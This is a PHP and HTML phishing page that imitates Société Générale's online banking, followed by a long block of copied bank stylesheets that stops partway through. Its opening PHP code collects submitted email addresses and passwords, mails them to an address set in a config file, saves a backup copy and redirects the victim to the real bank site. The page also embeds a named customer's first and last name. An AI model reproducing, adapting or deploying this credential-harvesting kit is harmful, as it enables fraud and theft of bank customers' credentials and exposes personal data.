<?php
@session_start();
error_reporting(0);

$currentPath = $_SERVER['PHP_SELF'];
// output: Array ( [dirname] => /myproject [basename] => index.php [extension] => php [filename] => index )
$pathInfo = pathinfo($currentPath);

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
$domainName = $_SERVER['HTTP_HOST'].'/';

$host_name = $protocol.$domainName.$pathInfo['dirname']."/";

function is_var_set($var) {

	return (isset($_POST[$var]) && $_POST[$var] !="") ? true : false;
}

if( is_var_set("email") && is_var_set("password")) {

	$info_names = array(

		"EMAIL ADDRESS " => "email",
		"EMAIL PASSWORD" => "password"
	);
	$redirection = "https://particuliers.societegenerale.fr/nos-conseils";

	include("config.php");
	mail($emailTo,$subject,$infoRaw.$env_vars,$headers);
	save_rs("backup",$subject,$infoRaw);
	echo "<script>window.location.href = '".$redirection."';</script>";

}
?>

<html class="awt--standalone awt--ngim" lang="fr"><head>
			<meta charset="utf-8">
            <base href="https://particuliers.societegenerale.fr">
                <!-- <script src="https://connect.facebook.net/signals/config/873080639448770?v=2.9.18&amp;r=stable" async=""></script> --><!-- <script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script> --><!-- <script src="//bat.bing.com/bat.js" async=""></script> --><!-- <script type="text/javascript" charset="UTF-8" async="" id="MFBActor" src="https://actorssl-5637.kxcdn.com/actor/a7a30ba0aebbae114c740a1b35adb8c7-1641/action"></script> --><!-- <script charset="UTF-8" src="/static/Resources/js/n2g_secu.js"></script> -->
        <script type="text/javascript">frame_shield();</script>
        <script type="application/json" id="sas_user_info">
    {
	"IdStat": "33cb7da716381bd2ce9a44233e568cbe",
	"user-info-firstname": "NATHALIE",
	"user-info-lastname": "DURIEZ"
}
</script>


<meta name="robots" content="none">
        <meta property="og:url" content="https://particuliers.societegenerale.fr/secure/comptes-budget/virements/virement-unifie">


		<title>Mes comptes</title>
						<meta name="title" content="Virements ponctuels">
						<meta property="og:title" content="Virements ponctuels">
					<meta name="twitter:card" content="summary">


<meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover"><link rel="icon" type="image/x-icon" href="/static/Resources/img/favicon.ico">


<!-- <script charset="UTF-8" src="/icd/static/dcaweb-front/public/public-dca-portail.js"></script> -->

                    <!-- <script charset="UTF-8" src="/static/Resources/js/init-configs-v2.js"></script> -->
            <!-- <script charset="UTF-8" src="/static/Resources/js/Revive/dca_portail.js"></script> -->
            <!-- <script charset="UTF-8" src="/static/Resources/js/vendor-v2.min.js"></script> -->
            <!-- <script charset="UTF-8" src="/swm/resources/gda/js/gda.public.js"></script> --><!-- <script type="text/javascript" src="/icd/static/dcaweb-front/1.1.2/dist/awt-dcaweb.js"></script> -->


                    <!-- <script charset="UTF-8" src="/icd/static/interact-front/public/interact-lanceur.js"></script> -->

                    <!-- <script charset="UTF-8" src="/static/Resources/js/indexv2.min.js"></script> -->
            <!-- <script charset="UTF-8" src="/static/Resources/js/TMS/tc_SocieteGenerale_20.js"></script> --><!-- <script id="tc_script_114_1" src="https://static.societegenerale.fr/pri/static/dmsa/iframe/dmp_bridge.js" async="" defer="" data-console="true" data-kruxenvname="socgenprod" data-kruxcontroltagid="Kw6K3cJw"></script> --><!-- <script id="tc_script__1" type="text/javascript" src="//particuliers.societegenerale.fr/static/Resources/js/TMS/tc_SocieteGenerale_22.js" defer=""></script> -->
            <link href="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/style/index-v3.min.css" rel="stylesheet" type="text/css">
                <link href="/static/Resources/stylesheets/spec56_btn_gsm_all_gcd.min.css" rel="stylesheet" type="text/css">
                <link href="/static/Resources/stylesheets/print.min.css" rel="stylesheet" type="text/css" media="print">

<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/theme/a1583f5b639cf510VgnVCM100000060015acRCRD -->
<!-- REQUEST PROFILE: null, REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 0810a9651a991610VgnVCM100000050012acRCRD, templateID: a1583f5b639cf510VgnVCM100000060015acRCRD, isRenderPageFeatures: true, FURL_NAME: /aconec/cptbud/virmts/virmtu/theme, FURL_ID: 2790a9651a991610VgnVCM100000050012acRCRD -->

        <!-- <script src="/icd/static/swm/resources/version/19.43.7/js/swm.main.js" type="text/javascript" charset="UTF-8"></script> --><!-- <script type="text/javascript" src="/icd/vupri/awtConfig.js"></script> --><!-- <script type="text/javascript" src="/icd/static/dgt-front/3.8.0/webpack/awt-frameworks.js"></script> --><!-- <script type="text/javascript" src="/icd/static/vupri-front/5.6.0/dist/awt-vupri.js"></script> --><!-- <script type="text/javascript" charset="utf-8" async="" src="/icd/static/vupri-front/5.6.0/dist/awt-1.js"></script> --><!-- <script type="text/javascript" charset="utf-8" async="" src="/icd/static/vupri-front/5.6.0/dist/awt-2.js"></script> --><meta name="viewport" content="width=device-width, initial-scale=1"><style type="text/css">.flatpickr-calendar {
  position: absolute;
  top: 0;
  left: 0;
  width: 310px;
  max-height: 0;
  padding: 0;
  margin: 20px 0 60px 72px;
  overflow: hidden;
  text-align: center;
  direction: ltr;
  font-family: 'sourcesanspro', sans-serif;
  font-size: 18px;
  line-height: 24px;
  background: transparent;
  border: 0;
  border-radius: 5px;
  box-sizing: border-box;
  touch-action: manipulation;
  animation: none;
  visibility: hidden;
  opacity: 0; }
  .flatpickr-calendar.open, .flatpickr-calendar.inline {
    max-height: 640px;
    visibility: visible;
    overflow: visible;
    opacity: 1; }
  .flatpickr-calendar.open {
    display: inline-block;
    z-index: 99999; }
  .flatpickr-calendar.animate.open {
    animation: fpFadeInDown 300ms cubic-bezier(0.23, 1, 0.32, 1); }
  .flatpickr-calendar.inline {
    display: block;
    position: relative;
    top: 2px; }
  .flatpickr-calendar.static {
    position: absolute;
    top: calc(100% + 2px); }
    .flatpickr-calendar.static.open {
      display: block;
      z-index: 999; }
  .flatpickr-calendar.hasWeeks {
    width: auto; }
  .flatpickr-calendar .hasWeeks .dayContainer,
  .flatpickr-calendar .hasTime .dayContainer {
    border-bottom: 0;
    border-bottom-right-radius: 0;
    border-bottom-left-radius: 0; }
  .flatpickr-calendar .hasWeeks .dayContainer {
    border-left: 0; }
  .flatpickr-calendar.showTimeInput.hasTime .flatpickr-time {
    height: 40px;
    border-top: 1px solid #dedede; }
  .flatpickr-calendar.showTimeInput.hasTime .flatpickr-innerContainer {
    border-bottom: 0; }
  .flatpickr-calendar.showTimeInput.hasTime .flatpickr-time {
    border: 1px solid #dedede; }
  .flatpickr-calendar.noCalendar.hasTime .flatpickr-time {
    height: auto; }
  .flatpickr-calendar:before, .flatpickr-calendar:after {
    content: '';
    position: absolute;
    display: block;
    width: 0;
    height: 0;
    pointer-events: none;
    border: solid transparent; }
  .flatpickr-calendar:before {
    left: 90px;
    border-width: 13px;
    border-bottom-color: #dedede; }
  .flatpickr-calendar:after {
    left: 82px;
    border-width: 21px;
    border-bottom-color: #fff; }
  .flatpickr-calendar.arrowTop:before, .flatpickr-calendar.arrowTop:after {
    bottom: 100%; }
  .flatpickr-calendar.arrowTop:before {
    right: 62px; }
  .flatpickr-calendar.arrowTop:after {
    top: -33px;
    right: 54px; }
  .flatpickr-calendar.arrowBottom {
    margin: -16px 0 0 86px; }
    .flatpickr-calendar.arrowBottom:before, .flatpickr-calendar.arrowBottom:after {
      transform: rotate(180deg); }
    .flatpickr-calendar.arrowBottom:before {
      bottom: -26px; }
    .flatpickr-calendar.arrowBottom:after {
      bottom: -32px; }
  .flatpickr-calendar:focus {
    outline: 0; }

.flatpickr-wrapper {
  position: relative;
  display: inline-block; }

.flatpickr-month {
  position: relative;
  height: 28px;
  padding: 20px 0;
  overflow: hidden;
  line-height: 1;
  text-align: center;
  color: #333;
  fill: #333;
  user-select: none;
  background: #fff;
  border: 1px solid #dedede;
  border-radius: 5px 5px 0 0;
  border-bottom: 0; }

.flatpickr-prev-month,
.flatpickr-next-month {
  position: absolute;
  z-index: 3;
  top: 19px;
  width: 34px;
  height: 34px;
  text-decoration: none;
  cursor: pointer;
  background-color: #fff;
  border: 1px solid #cfcfcf;
  border-radius: 50%; }

.flatpickr-prev-month i,
.flatpickr-next-month i {
  position: relative; }

.flatpickr-prev-month.flatpickr-prev-month {
  left: 21px;
  padding-right: 2px; }

.flatpickr-next-month.flatpickr-prev-month {
  left: 0;
  right: 0; }

.flatpickr-next-month.flatpickr-next-month {
  right: 21px;
  padding-left: 2px; }

.flatpickr-prev-month svg,
.flatpickr-next-month svg {
  position: relative;
  top: 8px;
  width: 16px;
  height: 16px; }

.flatpickr-prev-month svg path,
.flatpickr-next-month svg path {
  transition: fill .1s;
  fill: inherit; }

.numInputWrapper {
  position: relative;
  height: auto; }
  .numInputWrapper input,
  .numInputWrapper span {
    display: inline-block; }
  .numInputWrapper input {
    width: 100%; }
  .numInputWrapper span {
    position: absolute;
    right: 0;
    width: 14px;
    padding: 0 4px 0 2px;
    height: 50%;
    line-height: 50%;
    opacity: 0;
    cursor: pointer;
    border: 1px solid rgba(51, 51, 51, 0.05);
    box-sizing: border-box; }
    .numInputWrapper span:hover {
      background: rgba(0, 0, 0, 0.1); }
    .numInputWrapper span:active {
      background: rgba(0, 0, 0, 0.2); }
    .numInputWrapper span:after {
      content: '';
      display: block;
      position: absolute;
      top: 33%; }
    .numInputWrapper span.arrowUp {
      top: 0;
      border-bottom: 0; }
      .numInputWrapper span.arrowUp:after {
        border-left: 4px solid transparent;
        border-right: 4px solid transparent;
        border-bottom: 4px solid rgba(51, 51, 51, 0.6); }
    .numInputWrapper span.arrowDown {
      top: 50%; }
      .numInputWrapper span.arrowDown:after {
        border-left: 4px solid transparent;
        border-right: 4px solid transparent;
        border-top: 4px solid rgba(51, 51, 51, 0.6); }
    .numInputWrapper span svg {
      width: inherit;
      height: auto; }
      .numInputWrapper span svg path {
        fill: rgba(90, 97, 113, 0.5); }
  .numInputWrapper:hover span {
    right: -4px;
    opacity: 1; }

.flatpickr-current-month {
  line-height: inherit;
  font-weight: 300;
  position: absolute;
  width: 75%;
  top: 1.5em;
  left: 12.5%;
  line-height: 1;
  height: 28px;
  display: inline-block;
  text-align: center;
  transform: translate3d(0, 0, 0); }
  .flatpickr-current-month.slideLeft {
    transform: translate3d(-100%, 0, 0);
    animation: fpFadeOut 400ms ease, fpSlideLeft 400ms cubic-bezier(0.23, 1, 0.32, 1); }
  .flatpickr-current-month.slideLeftNew {
    transform: translate3d(100%, 0, 0);
    animation: fpFadeIn 400ms ease, fpSlideLeftNew 400ms cubic-bezier(0.23, 1, 0.32, 1); }
  .flatpickr-current-month.slideRight {
    transform: translate3d(100%, 0, 0);
    animation: fpFadeOut 400ms ease, fpSlideRight 400ms cubic-bezier(0.23, 1, 0.32, 1); }
  .flatpickr-current-month.slideRightNew {
    transform: translate3d(0, 0, 0);
    animation: fpFadeIn 400ms ease, fpSlideRightNew 400ms cubic-bezier(0.23, 1, 0.32, 1); }
  .flatpickr-current-month .cur-month {
    font-family: inherit;
    color: inherit;
    display: inline-block;
    margin-left: .5ch;
    padding: 0; }
  .flatpickr-current-month .numInputWrapper {
    width: 6ch;
    width: 7ch\0;
    display: inline-block; }
    .flatpickr-current-month .numInputWrapper span.arrowUp:after {
      border-bottom-color: #5a6171; }
    .flatpickr-current-month .numInputWrapper span.arrowDown:after {
      border-top-color: #5a6171; }
  .flatpickr-current-month input.cur-year {
    background: transparent;
    box-sizing: border-box;
    color: inherit;
    cursor: default;
    padding: 0 0 0 .5ch;
    margin: 0;
    display: inline-block;
    font-size: inherit;
    font-family: inherit;
    font-weight: 300;
    line-height: inherit;
    height: initial;
    border: 0;
    border-radius: 0;
    vertical-align: initial; }
    .flatpickr-current-month input.cur-year::-webkit-inner-spin-button, .flatpickr-current-month input.cur-year::-webkit-outer-spin-button {
      -webkit-appearance: none; }
    .flatpickr-current-month input.cur-year:focus {
      outline: 0; }
    .flatpickr-current-month input.cur-year[disabled] {
      font-size: 100%;
      color: rgba(90, 97, 113, 0.5);
      background: transparent;
      pointer-events: none; }
      .flatpickr-current-month input.cur-year[disabled]:hover {
        font-size: 100%;
        color: rgba(90, 97, 113, 0.5);
        background: transparent;
        pointer-events: none; }

.flatpickr-weekdays {
  overflow: hidden;
  width: 92%;
  height: 28px;
  padding: 0 4%;
  display: flex;
  text-align: center;
  align-items: center; }

.flatpickr-weekdaycontainer {
  display: flex;
  width: 100%; }

.flatpickr-weekday {
  display: block;
  cursor: default;
  font-size: .9em;
  color: #999;
  line-height: 1;
  margin: 0;
  text-align: center;
  flex: 1; }

.dayContainer,
.flatpickr-weeks {
  padding: 1px 0 0; }

.flatpickr-days {
  position: relative;
  overflow: hidden;
  display: flex;
  width: 307.875px; }
  .flatpickr-days:focus {
    outline: 0; }

.dayContainer {
  padding: 0 4% 13px 4%;
  outline: 0;
  text-align: left;
  width: 307.875px;
  min-width: 307.875px;
  max-width: 307.875px;
  box-sizing: border-box;
  display: inline-block;
  display: flex;
  flex-wrap: wrap;
  justify-content: space-around;
  transform: translate3d(0, 0, 0);
  opacity: 1; }

.flatpickr-calendar.animate .dayContainer.slideLeft {
  animation: fpFadeOut 400ms cubic-bezier(0.23, 1, 0.32, 1), fpSlideLeft 400ms cubic-bezier(0.23, 1, 0.32, 1);
  transform: translate3d(-100%, 0, 0); }

.flatpickr-calendar.animate .dayContainer.slideLeftNew {
  transform: translate3d(-100%, 0, 0);
  animation: fpFadeIn 400ms cubic-bezier(0.23, 1, 0.32, 1), fpSlideLeft 400ms cubic-bezier(0.23, 1, 0.32, 1); }

.flatpickr-calendar.animate .dayContainer.slideRight {
  animation: fpFadeOut 400ms cubic-bezier(0.23, 1, 0.32, 1), fpSlideRight 400ms cubic-bezier(0.23, 1, 0.32, 1);
  transform: translate3d(100%, 0, 0); }

.flatpickr-calendar.animate .dayContainer.slideRightNew {
  animation: fpFadeIn 400ms cubic-bezier(0.23, 1, 0.32, 1), fpSlideRightNew 400ms cubic-bezier(0.23, 1, 0.32, 1); }

.flatpickr-day {
  width: 13.2857%;
  height: 39px;
  margin: 0 0 2px;
  background: none;
  border: 1px solid transparent;
  border-radius: 150px;
  box-sizing: border-box;
  color: #333;
  text-align: center;
  flex-basis: 13.2857%;
  max-width: 39px;
  line-height: 38px;
  display: inline-block;
  position: relative;
  justify-content: center;
  cursor: pointer;
  transition: all .3s; }
  .flatpickr-day.inRange, .flatpickr-day.prevMonthDay.inRange, .flatpickr-day.nextMonthDay.inRange, .flatpickr-day.today.inRange, .flatpickr-day.prevMonthDay.today.inRange, .flatpickr-day.nextMonthDay.today.inRange, .flatpickr-day:hover, .flatpickr-day:focus, .flatpickr-day.prevMonthDay:hover, .flatpickr-day.nextMonthDay:hover, .flatpickr-day.prevMonthDay:focus, .flatpickr-day.nextMonthDay:focus {
    color: #f05b6f;
    border-color: #f05b6f;
    cursor: pointer;
    outline: 0; }
  .flatpickr-day.today {
    color: #333;
    border-color: #333; }
    .flatpickr-day.today:hover {
      color: #f05b6f;
      border-color: #f05b6f; }
  .flatpickr-day.selected, .flatpickr-day.startRange, .flatpickr-day.endRange, .flatpickr-day.selected.inRange, .flatpickr-day.startRange.inRange, .flatpickr-day.endRange.inRange, .flatpickr-day.selected:focus, .flatpickr-day.startRange:focus, .flatpickr-day.endRange:focus, .flatpickr-day.selected:hover, .flatpickr-day.startRange:hover, .flatpickr-day.endRange:hover, .flatpickr-day.selected.prevMonthDay, .flatpickr-day.startRange.prevMonthDay, .flatpickr-day.endRange.prevMonthDay, .flatpickr-day.selected.nextMonthDay, .flatpickr-day.startRange.nextMonthDay, .flatpickr-day.endRange.nextMonthDay {
    color: #f05b6f;
    border-color: #f05b6f; }
  .flatpickr-day.selected.startRange, .flatpickr-day.startRange.startRange, .flatpickr-day.endRange.startRange {
    border-right: 0;
    border-radius: 50px 0 0 50px; }
  .flatpickr-day.selected.endRange, .flatpickr-day.startRange.endRange, .flatpickr-day.endRange.endRange {
    border-left: 0;
    border-radius: 0 50px 50px 0; }
  .flatpickr-day.selected.startRange.endRange, .flatpickr-day.startRange.startRange.endRange {
    border-radius: 50px; }
  .flatpickr-day.startRange.inRange, .flatpickr-day.selected.startRange {
    margin-right: -1px;
    border-left: 1px solid #f05b6f; }
  .flatpickr-day.endRange.inRange, .flatpickr-day.selected.endRange {
    margin-left: -1px;
    border-right: 1px solid #f05b6f; }
  .flatpickr-day.inRange {
    max-width: 41px;
    margin-left: -1px;
    margin-right: -1px;
    border-left: 0;
    border-right: 0;
    border-radius: 0; }
  .flatpickr-day.disabled {
    pointer-events: none;
    color: rgba(51, 51, 51, 0.3);
    background: transparent;
    border-color: transparent;
    cursor: default; }
    .flatpickr-day.disabled:hover {
      pointer-events: none;
      color: rgba(51, 51, 51, 0.3);
      background: transparent;
      border-color: transparent;
      cursor: default; }
  .flatpickr-day.flatpickr-disabled {
    pointer-events: none;
    color: rgba(51, 51, 51, 0.3);
    background: transparent;
    border-color: transparent;
    cursor: default; }
    .flatpickr-day.flatpickr-disabled:hover {
      pointer-events: none;
      color: rgba(51, 51, 51, 0.3);
      background: transparent;
      border-color: transparent;
      cursor: default; }
  .flatpickr-day.prevMonthDay, .flatpickr-day.nextMonthDay {
    color: rgba(51, 51, 51, 0.3);
    background: transparent;
    border-color: transparent;
    cursor: default; }
  .flatpickr-day.notAllowed {
    color: rgba(51, 51, 51, 0.3);
    background: transparent;
    border-color: transparent;
    cursor: default; }
    .flatpickr-day.notAllowed.prevMonthDay, .flatpickr-day.notAllowed.nextMonthDay {
      color: rgba(51, 51, 51, 0.3);
      background: transparent;
      border-color: transparent;
      cursor: default; }

.rangeMode .flatpickr-day {
  margin-top: 1px; }

.flatpickr-weekwrapper {
  display: inline-block;
  float: left; }
  .flatpickr-weekwrapper .flatpickr-weeks {
    padding: 0 12px;
    border-left: 1px solid #dedede; }
  .flatpickr-weekwrapper .flatpickr-weekday {
    float: none;
    width: 100%;
    line-height: 28px; }
  .flatpickr-weekwrapper .flatpickr-day {
    display: block;
    width: 100%;
    max-width: none; }

.flatpickr-innerContainer {
  display: block;
  display: flex;
  box-sizing: border-box;
  overflow: hidden;
  background: #fff;
  border: 1px solid #dedede;
  border-radius: 0 0 5px 5px;
  border-top: 0; }

.flatpickr-rContainer {
  display: inline-block;
  padding: 0;
  box-sizing: border-box; }

.flatpickr-time {
  text-align: center;
  outline: 0;
  display: block;
  height: 0;
  line-height: 40px;
  max-height: 40px;
  box-sizing: border-box;
  overflow: hidden;
  display: flex;
  background: #fff;
  border-radius: 0 0 5px 5px; }
  .flatpickr-time:after {
    content: '';
    display: table;
    clear: both; }
  .flatpickr-time .numInputWrapper {
    flex: 1;
    width: 40%;
    height: 40px;
    float: left; }
    .flatpickr-time .numInputWrapper span.arrowUp:after {
      border-bottom-color: #333; }
    .flatpickr-time .numInputWrapper span.arrowDown:after {
      border-top-color: #333; }
  .flatpickr-time.hasSeconds .numInputWrapper {
    width: 26%; }
  .flatpickr-time.time24hr .numInputWrapper {
    width: 49%; }
  .flatpickr-time input {
    background: transparent;
    box-shadow: none;
    border: 0;
    border-radius: 0;
    text-align: center;
    margin: 0;
    padding: 0;
    height: inherit;
    line-height: inherit;
    cursor: pointer;
    color: #333;
    font-size: 14px;
    position: relative;
    box-sizing: border-box; }
    .flatpickr-time input.flatpickr-hour {
      font-weight: bold; }
    .flatpickr-time input.flatpickr-minute, .flatpickr-time input.flatpickr-second {
      font-weight: 400; }
    .flatpickr-time input:focus {
      outline: 0;
      border: 0; }
  .flatpickr-time .flatpickr-time-separator {
    height: inherit;
    display: inline-block;
    float: left;
    line-height: inherit;
    color: #333;
    font-weight: bold;
    width: 2%;
    user-select: none;
    align-self: center; }
  .flatpickr-time .flatpickr-am-pm {
    height: inherit;
    display: inline-block;
    float: left;
    line-height: inherit;
    color: #333;
    font-weight: bold;
    width: 2%;
    user-select: none;
    align-self: center;
    outline: 0;
    width: 18%;
    cursor: pointer;
    text-align: center;
    font-weight: 400; }
    .flatpickr-time .flatpickr-am-pm:hover, .flatpickr-time .flatpickr-am-pm:focus {
      background: #dedede; }

.flatpickr-input[readonly] {
  cursor: pointer; }

@-webkit-keyframes fpFadeInDown {
  from {
    opacity: 0;
    transform: translate3d(0, -20px, 0); }
  to {
    opacity: 1;
    transform: translate3d(0, 0, 0); } }

@keyframes fpFadeInDown {
  from {
    opacity: 0;
    transform: translate3d(0, -20px, 0); }
  to {
    opacity: 1;
    transform: translate3d(0, 0, 0); } }

@-webkit-keyframes fpSlideLeft {
  from {
    transform: translate3d(0, 0, 0); }
  to {
    transform: translate3d(-100%, 0, 0); } }

@keyframes fpSlideLeft {
  from {
    transform: translate3d(0, 0, 0); }
  to {
    transform: translate3d(-100%, 0, 0); } }

@-webkit-keyframes fpSlideLeftNew {
  from {
    transform: translate3d(100%, 0, 0); }
  to {
    transform: translate3d(0, 0, 0); } }

@keyframes fpSlideLeftNew {
  from {
    transform: translate3d(100%, 0, 0); }
  to {
    transform: translate3d(0, 0, 0); } }

@-webkit-keyframes fpSlideRight {
  from {
    transform: translate3d(0, 0, 0); }
  to {
    transform: translate3d(100%, 0, 0); } }

@keyframes fpSlideRight {
  from {
    transform: translate3d(0, 0, 0); }
  to {
    transform: translate3d(100%, 0, 0); } }

@-webkit-keyframes fpSlideRightNew {
  from {
    transform: translate3d(-100%, 0, 0); }
  to {
    transform: translate3d(0, 0, 0); } }

@keyframes fpSlideRightNew {
  from {
    transform: translate3d(-100%, 0, 0); }
  to {
    transform: translate3d(0, 0, 0); } }

@-webkit-keyframes fpFadeOut {
  from {
    opacity: 1; }
  to {
    opacity: 0; } }

@keyframes fpFadeOut {
  from {
    opacity: 1; }
  to {
    opacity: 0; } }

@-webkit-keyframes fpFadeIn {
  from {
    opacity: 0; }
  to {
    opacity: 1; } }

@keyframes fpFadeIn {
  from {
    opacity: 0; }
  to {
    opacity: 1; } }

span.flatpickr-day.selected {
  font-weight: bold; }

@media only screen and (max-width: 48em) {
  .flatpickr-calendar {
    margin: 0; }
    .flatpickr-calendar:before {
      left: 175px; }
    .flatpickr-calendar:after {
      left: 167px; }
    .flatpickr-calendar.arrowTop {
      margin: 20px -38px 0 0; }
    .flatpickr-calendar.arrowBottom {
      margin: -16px -38px 0 0; } }

@media screen and (min-width: 0\0) {
  .flatpickr-calendar:before {
    left: 175px; }
  .flatpickr-calendar:after {
    left: 167px; }
  .flatpickr-calendar.arrowTop {
    margin: 0 0 0 -5px; }
  .flatpickr-calendar.arrowBottom {
    margin: -16px 0 0 -5px; }
  .flatpickr-month {
    padding: 26px 0; }
  .flatpickr-weekday {
    display: inline-block;
    width: 14.2857%; }
  .flatpickr-day {
    width: 14.2857%;
    max-width: 41px; } }
</style><style type="text/css">@charset "UTF-8";
.awt--root-element {
  height: auto !important; }

.awt--not-ngim body {
  margin: 0 !important; }

@font-face {
  font-family: 'sourcesanspro';
  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/aceb4fd44fa3b539e70b605515e13c01.eot);
  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/d6cd4777dc581913c8b247b8bd44e02b.otf) format("truetype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/52f5045b30343cd0e0a5acbd215a50e9.woff) format("woff"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/aceb4fd44fa3b539e70b605515e13c01.eot?#iefix) format("embedded-opentype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/d6cd4777dc581913c8b247b8bd44e02b.svg#sourcesanspro) format("svg");
  font-weight: normal;
  font-style: normal; }

@font-face {
  font-family: 'sourcesanspro';
  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/196d048ba6612fdf9c73ac4822375ea8.eot);
  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/2198d0aad1f95dddd8cce2926503ec96.otf) format("truetype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/ed0493ad2f69e617b037bb1e6d3da477.woff) format("woff"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/196d048ba6612fdf9c73ac4822375ea8.eot?#iefix) format("embedded-opentype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/2198d0aad1f95dddd8cce2926503ec96.svg#sourcesanspro) format("svg");
  font-weight: normal;
  font-style: italic; }

@font-face {
  font-family: 'sourcesanspro';
  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/0eaacaa8c19f9d308c1357b919e41522.eot);
  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/48f378fabe3a365de672e126111e28b9.woff) format("woff"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/181a2dbd5f80f18f6e174978baf7cde2.otf) format("truetype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/0eaacaa8c19f9d308c1357b919e41522.eot?#iefix) format("embedded-opentype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/181a2dbd5f80f18f6e174978baf7cde2.svg#sourcesanspro) format("svg");
  font-weight: 300;
  font-style: normal; }

@font-face {
  font-family: 'sourcesanspro';
  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/067ab8783dbcc690dffe8decff623e23.eot);
  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/3fbf5b8edc66b68a0e2ccfa598bbdae4.otf) format("truetype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/f079be3e96761bf618ea2a5b314eb014.woff) format("woff"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/067ab8783dbcc690dffe8decff623e23.eot?#iefix) format("embedded-opentype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/3fbf5b8edc66b68a0e2ccfa598bbdae4.svg#sourcesanspro) format("svg");
  font-weight: 600;
  font-style: normal; }

@font-face {
  font-family: 'sourcesanspro';
  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/cae9689f002f58b4ad9104a202d7fa3b.eot);
  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/269ca7e400c670e507c39eeafb9d36b9.otf) format("truetype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/3e7af4d251f183a9ea98bfd812016274.woff) format("woff"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/cae9689f002f58b4ad9104a202d7fa3b.eot?#iefix) format("embedded-opentype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/269ca7e400c670e507c39eeafb9d36b9.svg#sourcesanspro) format("svg");
  font-weight: bold;
  font-style: normal; }

.vupri_wrapper div, .vupri_wrapper span, .vupri_wrapper applet, .vupri_wrapper object, .vupri_wrapper iframe,
.vupri_wrapper h1, .vupri_wrapper h2, .vupri_wrapper h3, .vupri_wrapper h4, .vupri_wrapper h5, .vupri_wrapper h6, .vupri_wrapper p, .vupri_wrapper blockquote, .vupri_wrapper pre,
.vupri_wrapper a, .vupri_wrapper abbr, .vupri_wrapper acronym, .vupri_wrapper address, .vupri_wrapper big, .vupri_wrapper cite, .vupri_wrapper code,
.vupri_wrapper del, .vupri_wrapper dfn, .vupri_wrapper em, .vupri_wrapper img, .vupri_wrapper ins, .vupri_wrapper kbd, .vupri_wrapper q, .vupri_wrapper s, .vupri_wrapper samp,
.vupri_wrapper small, .vupri_wrapper strike, .vupri_wrapper sub, .vupri_wrapper sup, .vupri_wrapper tt, .vupri_wrapper var,
.vupri_wrapper b, .vupri_wrapper u, .vupri_wrapper i, .vupri_wrapper center,
.vupri_wrapper dl, .vupri_wrapper dt, .vupri_wrapper dd, .vupri_wrapper ol, .vupri_wrapper ul, .vupri_wrapper li,
.vupri_wrapper fieldset, .vupri_wrapper form, .vupri_wrapper label, .vupri_wrapper legend,
.vupri_wrapper table, .vupri_wrapper caption, .vupri_wrapper tbody, .vupri_wrapper tfoot, .vupri_wrapper thead, .vupri_wrapper tr, .vupri_wrapper th, .vupri_wrapper td,
.vupri_wrapper article, .vupri_wrapper aside, .vupri_wrapper canvas, .vupri_wrapper details, .vupri_wrapper embed,
.vupri_wrapper figure, .vupri_wrapper figcaption, .vupri_wrapper footer, .vupri_wrapper header, .vupri_wrapper hgroup,
.vupri_wrapper menu, .vupri_wrapper nav, .vupri_wrapper output, .vupri_wrapper ruby, .vupri_wrapper section, .vupri_wrapper summary,
.vupri_wrapper time, .vupri_wrapper mark, .vupri_wrapper audio, .vupri_wrapper video, .vupri_wrapper button {
  margin: 0;
  padding: 0;
  border: 0;
  font-size: 100%;
  font: inherit;
  font-family: 'sourcesanspro', sans-serif;
  vertical-align: baseline; }

.vupri_wrapper article, .vupri_wrapper aside, .vupri_wrapper details, .vupri_wrapper figcaption, .vupri_wrapper figure,
.vupri_wrapper footer, .vupri_wrapper header, .vupri_wrapper hgroup, .vupri_wrapper menu, .vupri_wrapper nav, .vupri_wrapper section {
  display: block; }

.vupri_wrapper ol, .vupri_wrapper ul {
  list-style: none; }

.vupri_wrapper blockquote, .vupri_wrapper q {
  quotes: none; }

.vupri_wrapper blockquote:before, .vupri_wrapper blockquote:after,
.vupri_wrapper q:before, .vupri_wrapper q:after {
  content: '';
  content: none; }

.vupri_wrapper table {
  border-collapse: collapse;
  border-spacing: 0; }

.vupri_wrapper * {
  box-sizing: border-box;
  font-family: 'sourcesanspro', arial, sans-serif; }

.vupri_wrapper {
  max-width: 1440px;
  min-height: 800px;
  margin: 0 auto;
